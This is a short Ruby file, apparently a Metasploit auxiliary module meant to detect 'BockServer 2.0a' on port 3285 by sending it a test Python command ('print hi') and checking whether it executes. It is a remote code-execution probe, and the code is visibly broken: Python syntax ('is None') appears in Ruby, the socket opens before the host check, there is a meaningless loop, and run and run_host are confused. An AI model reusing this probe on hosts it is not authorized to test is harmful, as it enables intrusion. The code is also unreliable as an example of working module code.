require 'socket'
require 'msf/core/auxiliary/report'
class MetasploitModule < Msf::Auxiliary
    include Msf::Auxiliary::Report

    def initialize
        super(
        'Name'           => 'BockServer 2.0a Identifier',
        'Description'    => 'This module can identify BockServer 2.0a, which will run arbitrary python commands',
        'DefaultOptions' => { 'RPORT' => 3285 }
        )
        
        register_options(
            [
              OptString.new('RHOST', [ true, 'Set a remote host' ]),
	      OptString.new('RPORT', [ true, 'Set a remote port' ])
            ], self.class)
    end
    def run
	print_good("this is what is used")
	puts "found it"
    end
    def run_host(ip)
        s = TCPSocket.open(rhost, rport)
        if rhost is None or rport is None
            print_error("rhost or rport is not properly configured")
            return
        end
	begin
            line = s.gets
	rescue Exception => e
	    print_status("#{rhost}:#{rport} is not vulnerable.")
	    puts "No vulnerability detected"
	end
        if line =~ /BockServe 2.0a/
	    s.send("view")
	    while s.gets
		x = 5
	    end
	    s.send("yes")
	    s.gets
	    s.send("print hi")
	    line = s.gets
	    if line =~ /(python -c) | (hi)/
    	        print_status("#{rhost}:#{rport} is vulnerable.")
	    else
		print_status("not vulnerable")
	    end
        else 
            print_status("#{rhost}:#{rport} is not vulnerable.")
	    print "not vulnerable"
        end 
    end
end
